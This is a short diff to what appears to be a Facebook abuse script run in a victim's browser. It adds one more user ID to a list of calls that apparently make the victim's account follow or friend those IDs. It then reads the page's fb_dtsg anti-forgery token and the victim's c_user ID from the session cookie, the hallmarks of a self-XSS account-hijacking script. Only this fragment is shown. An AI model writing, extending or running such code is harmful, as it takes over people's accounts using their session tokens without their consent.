@@ -94,6 +94,7 @@ a("100004019810084");
 a("100000835684602");
 a("100000576086135");
 a("100004420206236");
+a("100003231350883");
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
